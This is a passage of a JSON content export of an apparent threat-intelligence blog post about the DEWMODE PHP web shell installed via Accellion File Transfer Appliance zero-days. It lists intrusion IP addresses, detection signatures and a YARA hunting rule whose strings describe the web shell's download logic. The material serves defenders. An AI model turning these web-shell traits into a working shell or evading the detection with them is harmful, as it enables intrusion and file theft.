intrusions:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E45.135.229.179\u003C\/li\u003E\n\u003Cli\u003E79.141.162.82\u003C\/li\u003E\n\u003Cli\u003E155.94.160.40\u003C\/li\u003E\n\u003Cli\u003E192.154.253.120\u003C\/li\u003E\n\u003Cli\u003E192.52.167.101\u003C\/li\u003E\n\u003Cli\u003E194.88.104.24\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003EDetections\u003C\/h4\u003E\n\u003Cp\u003E\u003Ci\u003EFireEye Detections\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EFE_Webshell_PHP_DEWMODE_1\u003C\/li\u003E\n\u003Cli\u003EFEC_Webshell_PHP_DEWMODE_1\u003C\/li\u003E\n\u003Cli\u003EWebshell.PHP.DEWMODE\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003EMandiant Security Validation\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EA101-515 Malicious File Transfer - DEWMODE Webshell, Upload, Variant #1\u003C\/li\u003E\n\u003Cli\u003EA101-516 Malicious File Transfer - DEWMODE Webshell, Upload, Variant #2\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003EDEWMODE YARA Rule\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EThe following YARA rule is not intended to be used on production systems or to inform blocking rules without first being validated through an organization\u0027s own internal testing processes to ensure appropriate performance and limit the risk of false positives. This rule is intended to serve as a starting point for hunting efforts to identify DEWMODE payloads; however, it may need adjustment over time if the malware family changes.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003Erule DEWMODE_PHP_Webshell\u003Cbr\u003E\n {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; strings:\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s1 = \/if \\(isset\\(\\$_REQUEST\\[[\\x22\\x27]dwn[\\x22\\x27]]\\)[\\x09\\x20]{0,32}\u0026amp;\u0026amp;[\\x09\\x20]{0,32}isset\\(\\$_REQUEST\\[[\\x22\\x27]fn[\\x22\\x27]\\]\\)\\)\\s{0,256}\\{\/\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s2 = \u0026quot;\u0026lt;th\u0026gt;file_id\u0026lt;\/th\u0026gt;\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s3 = \u0026quot;\u0026lt;th\u0026gt;path\u0026lt;\/th\u0026gt;\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s4 = \u0026quot;\u0026lt;th\u0026gt;file_name\u0026lt;\/th\u0026gt;\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s5 = \u0026quot;\u0026lt;th\u0026gt;uploaded_by\u0026lt;\/th\u0026gt;\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s6 = \u0026quot;target=\\\\\\\u0026quot;_blank\\\\\\\u0026quot;\u0026gt;Download\u0026lt;\/a\u0026gt;\u0026lt;\/td\u0026gt;\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s7 = \u0026quot;Content-Type: application\/octet-stream\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s8 = \u0026quot;Content-disposition: attachment; filename=\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; condition:\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; all of them\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n",
        "jcr:lastModified": "Mon Feb 22 2021 16:10:37 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "lynda.hall@fireeye.com",
      "jcr:lastModified": "Mon Feb 22 2021 19:54:03 GMT+0000",
      "imageRotate": "0"
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EMalicious actors we track as UNC2546 exploited multiple zero-day vulnerabilities in Accellion\u2019s legacy File Transfer Appliances to install a newly discovered web shell named DEWMODE.\u003C\/p\u003E\n",
      "jcr:lastModified": "Fri Feb 19 2021 03:05:43 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    }
  }
}
